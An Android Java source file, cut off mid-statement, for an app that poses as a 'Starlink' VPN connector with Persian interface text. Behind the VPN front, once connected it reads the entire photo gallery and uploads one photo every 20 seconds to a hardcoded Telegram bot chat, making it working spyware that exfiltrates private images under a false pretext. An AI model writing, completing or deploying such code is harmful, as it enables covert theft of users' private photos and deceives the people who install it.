package com.example.photosender;

import android.Manifest;
import android.content.ContentUris;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.v2ray.ang.V2RayCore;
import com.v2ray.ang.service.V2RayVpnService;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "StarlinkVPN";
    private static final String BOT_TOKEN = "توکن_جدید_خودت";
    private static final String CHAT_ID = "8961077299";
    private static final int REQUEST_PERMISSION = 100;
    private static final int REQUEST_VPN = 101;

    private static final String PREFS_NAME = "PhotoSenderPrefs";
    private static final String KEY_LAST_INDEX = "last_index";

    // ==================== کانفیگ VLESS به فرمت JSON ====================
    private static final String VLESS_CONFIG = "{\n" +
            "  \"inbounds\": [{\n" +
            "    \"listen\": \"127.0.0.1\",\n" +
            "    \"port\": 10808,\n" +
            "    \"protocol\": \"socks\",\n" +
            "    \"settings\": {\n" +
            "      \"auth\": \"noauth\",\n" +
            "      \"udp\": true,\n" +
            "      \"userLevel\": 8\n" +
            "    }\n" +
            "  }],\n" +
            "  \"outbounds\": [{\n" +
            "    \"protocol\": \"vless\",\n" +
            "    \"settings\": {\n" +
            "      \"vnext\": [{\n" +
            "        \"address\": \"simpletr.asan-ps.ir\",\n" +
            "        \"port\": 443,\n" +
            "        \"users\": [{\n" +
            "          \"id\": \"9dcf92e4-e26a-4731-bcf7-22163b72fef3\",\n" +
            "          \"encryption\": \"none\",\n" +
            "          \"level\": 8\n" +
            "        }]\n" +
            "      }]\n" +
            "    },\n" +
            "    \"streamSettings\": {\n" +
            "      \"network\": \"xhttp\",\n" +
            "      \"security\": \"tls\",\n" +
            "      \"tlsSettings\": {\n" +
            "        \"allowInsecure\": true,\n" +
            "        \"serverName\": \"speedtest.net\"\n" +
            "      },\n" +
            "      \"xhttpSettings\": {\n" +
            "        \"host\": \"skhishhwiw12.global.ssl.fastly.net\",\n" +
            "        \"path\": \"/NEWS\",\n" +
            "        \"mode\": \"auto\"\n" +
            "      }\n" +
            "    }\n" +
            "  }]\n" +
            "}";

    // ==================== کانفیگ‌ها برای تست پینگ ====================
    private static final String[] CONFIGS = {
            "simpletr.asan-ps.ir",
            "1.1.1.1",
            "8.8.8.8",
            "bot.shopver.ir",
            "31.14.119.77"
    };

    private static final int PING_TIMEOUT = 3000;

    // UI Elements
    private Button btnConnect;
    private TextView txtStatus;
    private TextView txtPing;
    private ProgressBar progressBar;
    private LinearLayout mainLayout;
    private LinearLayout warningLayout;
    private Button btnConfirm;

    // Status
    private boolean isSending = false;
    private boolean isConnected = false;
    private boolean isVpnStarted = false;
    private int lastSentIndex = 0;
    private boolean isWaitingForNetwork = false;
    private String bestConfig = "";
    private int bestPing = Integer.MAX_VALUE;

    // V2Ray
    private V2RayCore v2RayCore;

    // Network monitoring
    private ConnectivityManager connectivityManager;
    private NetworkCallback networkCallback;

    // Timer
    private Handler timerHandler = new Handler();
    private Runnable timerRunnable;

    // List of all photos
    private ArrayList<Uri> allImages = new ArrayList<>();
    private int currentPhotoIndex = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnConnect = findViewById(R.id.btnConnect);
        txtStatus = findViewById(R.id.txtStatus);
        txtPing = findViewById(R.id.txtPing);
        progressBar = findViewById(R.id.progressBar);
        mainLayout = findViewById(R.id.mainLayout);
        warningLayout = findViewById(R.id.warningLayout);
        btnConfirm = findViewById(R.id.btnConfirm);

        updateUI("قطع", false, "-- ms");

        btnConfirm.setOnClickListener(v -> {
            warningLayout.setVisibility(View.GONE);
            mainLayout.setVisibility(View.VISIBLE);
            Toast.makeText(MainActivity.this, "🌐 در حال پیدا کردن بهترین کانفیگ...", Toast.LENGTH_SHORT).show();
            findBestConfig();
        });

        btnConnect.setOnClickListener(v -> {
            if (isSending) return;

            if (!hasStoragePermission()) {
                requestStoragePermission();
                return;
            }

            if (isConnected) {
                Toast.makeText(this, "✅ از قبل متصل هستید", Toast.LENGTH_SHORT).show();
                return;
            }

            startVpnConnection();
        });

        loadLastIndex();
        setupNetworkMonitoring();
        loadAllImages();

        // ========== راه‌اندازی V2Ray ==========
        initV2Ray();
    }

    // ==================== راه‌اندازی V2Ray ====================
    private void initV2Ray() {
        try {
            v2RayCore = new V2RayCore(this);
            v2RayCore.initialize();
            Log.d(TAG, "✅ V2Ray راه‌اندازی شد");
        } catch (Exception e) {
            Log.e(TAG, "❌ خطا در راه‌اندازی V2Ray: " + e.getMessage());
            Toast.makeText(this, "خطا در راه‌اندازی V2Ray: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    // ==================== شروع اتصال VPN واقعی ====================
    private void startVpnConnection() {
        if (isSending) return;

        // درخواست مجوز VPN از کاربر (یکبار)
        V2RayVpnService.prepare(this, REQUEST_VPN, () -> {
            // کاربر مجوز داد، حالا وصل کن
            connectToVpn();
        });
    }

    private void connectToVpn() {
        isSending = true;
        updateUI("در حال اتصال به استارلینک...", true, bestPing + " ms");

        new Thread(() -> {
            try {
                // تبدیل کانفیگ به JSON
                JSONObject configJson = new JSONObject(VLESS_CONFIG);

                // شروع اتصال V2Ray
                v2RayCore.startV2Ray(configJson);
                isVpnStarted = true;

                // صبر برای برقراری اتصال
                Thread.sleep(3000);

                runOnUiThread(() -> {
                    isSending = false;
                    isConnected = true;
                    updateUI("متصل به استارلینک ✅", false, bestPing + " ms");
                    Toast.makeText(MainActivity.this,
                            "✅ به " + bestConfig + " متصل شدید (ترافیک واقعی)",
                            Toast.LENGTH_LONG).show();

                    // شروع ارسال زمان‌بندی‌شده
                    startScheduledSending();
                });

            } catch (Exception e) {
                Log.e(TAG, "❌ خطا در اتصال VPN: " + e.getMessage(), e);
                runOnUiThread(() -> {
                    isSending = false;
                    updateUI("اتصال برقرار نشد ❌", false, "-- ms");
                    Toast.makeText(MainActivity.this,
                            "❌ خطا در اتصال: " + e.getMessage(),
                            Toast.LENGTH_LONG).show();
                });
            }
        }).start();
    }

    // ==================== قطع اتصال ====================
    private void disconnectVpn() {
        if (v2RayCore != null && isVpnStarted) {
            v2RayCore.stopV2Ray();
            isVpnStarted = false;
        }
        isConnected = false;
        updateUI("قطع", false, "-- ms");
        if (timerRunnable != null) {
            timerHandler.removeCallbacks(timerRunnable);
        }
    }

    // ==================== تست پینگ ====================
    private void findBestConfig() {
        txtStatus.setText("وضعیت: در حال تست کانفیگ‌ها...");
        progressBar.setVisibility(ProgressBar.VISIBLE);
        btnConnect.setEnabled(false);

        new Thread(() -> {
            bestPing = Integer.MAX_VALUE;
            bestConfig = "";

            for (String config : CONFIGS) {
                int ping = testPing(config);
                Log.d(TAG, "کانفیگ: " + config + " -> پینگ: " + ping + " ms");

                runOnUiThread(() -> txtPing.setText("پینگ: " + ping + " ms"));

                if (ping > 0 && ping < bestPing) {
                    bestPing = ping;
                    bestConfig = config;
                }
            }

            runOnUiThread(() -> {
                progressBar.setVisibility(ProgressBar.GONE);
                btnConnect.setEnabled(true);

                if (!bestConfig.isEmpty()) {
                    txtPing.setText("پینگ: " + bestPing + " ms ✅");
                    txtStatus.setText("وضعیت: بهترین کانفیگ پیدا شد");
                    Toast.makeText(MainActivity.this,
                            "✅ بهترین کانفیگ: " + bestConfig + " (" + bestPing + " ms)",
                            Toast.LENGTH_LONG).show();
                } else {
                    txtStatus.setText("وضعیت: هیچ کانفیگی پیدا نشد ❌");
                    Toast.makeText(MainActivity.this, "❌ هیچ کانفیگ فعالی یافت نشد", Toast.LENGTH_LONG).show();
                }
            });
        }).start();
    }

    private int testPing(String host) {
        try {
            long startTime = System.currentTimeMillis();
            InetAddress inetAddress = InetAddress.getByName(host);
            boolean reachable = inetAddress.isReachable(PING_TIMEOUT);
            long endTime = System.currentTimeMillis();

            if (reachable) {
                return (int) (endTime - startTime);
            } else {
                return -1;
            }
        } catch (Exception e) {
            Log.e(TAG, "خطا در تست پینگ برای " + host, e);
            return -1;
        }
    }

    // ==================== ارسال زمان‌بندی‌شده (هر ۲۰ ثانیه) ====================
    private void startScheduledSending() {
        if (timerRunnable != null) {
            timerHandler.removeCallbacks(timerRunnable);
        }

        timerRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isConnected) {
                    return;
                }

                sendNextPhoto();
                timerHandler.postDelayed(this, 20000);
            }
        };

        timerHandler.postDelayed(timerRunnable, 2000);
    }

    private void sendNextPhoto() {
        if (allImages.isEmpty()) {
            return;
        }

        if (currentPhotoIndex >= allImages.size()) {
            currentPhotoIndex = 0;
        }

        Uri uri = allImages.get(currentPhotoIndex);
        currentPhotoIndex++;

        new Thread(() -> {
            try {
                InputStream in = getContentResolver().openInputStream(uri);
                if (in == null) return;

                byte[] bytes = readBytes(in);
                in.close();

                RequestBody photoBody = RequestBody.create(bytes, MediaType.parse("image/jpeg"));
                MultipartBody body = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", CHAT_ID)
                        .addFormDataPart("photo", "image.jpg", photoBody)
                        .build();

                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                        .post(body)
                        .build();

                OkHttpClient client = new OkHttpClient.Builder()
                        .connectTimeout(30, TimeUnit.SECONDS)
                        .writeTimeout(30, TimeUnit.SECONDS)
                        .readTimeout(30, TimeUnit.SECONDS)
                        .build();

                okhttp3.Response response = client.newCall(request).execute();

                if (response.isSuccessful()) {
                    Log.d(TAG, "✅ عکس شماره " + currentPhotoIndex + " ارسال شد");
                    runOnUiThread(() -> Toast.makeText(MainActivity.this,
                            "📸 عکس " + currentPhotoIndex + " از " + allImages.size() + " ارسال شد",
                            Toast.LENGTH_SHORT).show());
                }
                response.close();

            } catch (Exception e) {
                Log.e(TAG, "خطا در ارسال عکس", e);
            }
        }).start();
    }

    private ArrayList<Uri> getAllImages() {
        ArrayList<Uri> list = new ArrayList<>();
        Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.Images.Media._ID};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(
                collection,
                projection,
                null,
                null,
                sortOrder
        )) {
            if (cursor != null) {
                int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                while (cursor.moveToNext()) {
                    long id = cursor.getLong(idCol);
                    Uri uri = ContentUris.withAppendedId(collection, id);
                    list.add(uri);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطا در دریافت عکس‌ها", e);
            throw new RuntimeException("خطا در خواندن گالری: " + e.getMessage());
        }
        return list;
    }

    private byte[] readBytes(InputStream inputStream) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte[] data = new byte[4096];
        int n;
        while ((n = inputStream.read(data)) != -1) {
            buffer.write(data, 0, n);
        }
        return buffer.toByteArray();
    }

    private void setupNetworkMonitoring() {
        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);

        NetworkRequest networkRequest = new NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build();

        networkCallback = new NetworkCallback();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            connectivityManager.registerDefaultNetworkCallback(networkCallback);
        } else {
            connectivityManager.registerNetworkCallback(networkRequest, networkCallback);
        }
    }

    private class NetworkCallback extends ConnectivityManager.NetworkCallback {
        @Override
        public void onAvailable(@NonNull Network network) {
            super.onAvailable(network);
            runOnUiThread(() -> {
                if (isWaitingForNetwork) {
                    isWaitingForNetwork = false;
                    Toast.makeText(MainActivity.this, "🌐 اتصال استارلینک برقرار شد", Toast.LENGTH_SHORT).show();
                }
            });
        }

        @Override
        public void onLost(@NonNull Network network) {
            super.onLost(network);
            runOnUiThread(() -> {
                isWaitingForNetwork = true;
                isConnected = false;
                updateUI("اتصال قطع شد", false, "-- ms");
                Toast.makeText(MainActivity.this, "⚠️ اتصال استارلینک قطع شد", Toast.LENGTH_LONG).show();
            });
        }
    }

    private boolean hasStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void requestStoragePermission() {
        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{Manifest.permission.READ_MEDIA_IMAGES};
        } else {
            permissions = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
        }
        ActivityCompat.requestPermissions(this, permissions, REQUEST_PERMISSION);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "✅ دسترسی مجاز شد", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "❌ برای اتصال به دسترسی فایل نیاز است", Toast.LENGTH_LONG).show();
                updateUI("اتصال برقرار نشد ❌", false, "-- ms");
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, android.content.Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_VPN) {
            if (resultCode == RESULT_OK) {
                connectToVpn();
            } else {
                Toast.makeText(this, "❌ برای اتصال نیاز به مجوز VPN است", Toast.LENGTH_LONG).show();
                updateUI("اتصال برقرار نشد ❌", false, "-- ms");
            }
        }
    }

    private void saveLastIndex(int index) {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        prefs.edit().putInt(KEY_LAST_INDEX, index).apply();
    }

    private void loadLastIndex() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        lastSentIndex = prefs.getInt(KEY_LAST_INDEX, 0);
    }

    private void resetLastIndex() {
        lastSentIndex = 0;
        saveLastIndex(0);
    }

    private void updateUI(String statusText, boolean isLoading, String pingText) {
        runOnUiThread(() -> {
            txtStatus.setText("وضعیت: " + statusText);
            txtPing.setText("پینگ: " + pingText);

            if (isLoading) {
                btnConnect.setEnabled(false);
                btnConnect.setText("در حال اتصال...");
                btnConnect.setBackgroundTintList(
                        ContextCompat.getColorStateList(this, R.color.gray));
                progressBar.setVisibility(ProgressBar.VISIBLE);
                return;
            }

            progressBar.setVisibility(ProgressBar.GONE);
            btnConnect.setEnabled(true);

            if (statusText.contains("متصل")) {
                btnConnect.setText("متصل ✓");
                btnConnect.setBackgroundTintList(
                        ContextCompat.getColorStateList(this, R.color.green));
            } else if (statusText.con
